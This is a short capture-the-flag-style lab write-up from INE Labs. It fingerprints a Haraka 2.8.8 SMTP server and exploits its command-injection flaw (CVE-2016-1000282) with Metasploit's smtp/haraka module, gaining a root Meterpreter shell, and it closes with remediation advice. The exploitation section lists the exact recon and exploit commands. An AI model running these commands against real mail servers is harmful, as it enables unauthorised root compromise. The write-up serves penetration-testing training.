---
title: "Vulnerable SMTP Server"
description: "Fingerprinting a Haraka SMTP server and exploiting its command-injection vulnerability with Metasploit's smtp/haraka module to land a root Meterpreter session."
date: 2025-11-14
platform: "INE Labs"
difficulty: "Easy"
tags: ["SMTP", "Haraka", "CVE-2016-1000282", "Metasploit", "Meterpreter", "Linux"]
cover: "./photo4.png"
---

# Vulnerable SMTP Server

**Classification:** Host & Network Penetration Testing / The Metasploit Framework<br>
**Target:** demo.ine.local (192.221.73.3) — Ubuntu 16.04, Haraka smtpd 2.8.8<br>
**Attacker:** 192.221.73.2 (Kali)<br>
**Objective:** Fingerprint the service and exploit it for a shell.

## 1. Executive Summary

The target runs the **Haraka** Node.js SMTP server (2.8.8), vulnerable to a command
injection in its attachment processing (CVE-2016-1000282). Metasploit's `smtp/haraka` module
exploits it and returns a **root** Meterpreter session.

## 2. Recon

```bash
ping -c 4 demo.ine.local
db_nmap -sV 192.221.73.3
services
```

![Ping target](./photo1.png)

![MSF global variables](./photo2.png)

![Nmap scan](./photo3.png)

Port 25 runs **Haraka smtpd 2.8.8**.

![services — Haraka smtpd 2.8.8](./photo4.png)

## 3. Exploitation

```bash
search haraka
use exploit/linux/smtp/haraka
set SRVPORT 8080
set email_to root@demo.ine.local
set RHOSTS 192.221.73.3
exploit
```

![Selecting the haraka module (1)](./photo5.png)

![Exploit launched (2)](./photo6.png)

A root Meterpreter session opens.

```
sysinfo    # Ubuntu 16.04
getuid     # root
```

![Root Meterpreter session](./photo7.png)

## 4. Remediation Recommendations

1. **Upgrade Haraka** past the vulnerable release (CVE-2016-1000282) and keep Node.js
   dependencies patched.
2. **Run the mail service with least privilege**, not as root, and sandbox attachment
   processing.
3. **Restrict and monitor SMTP** exposure; filter/validate inbound attachments.
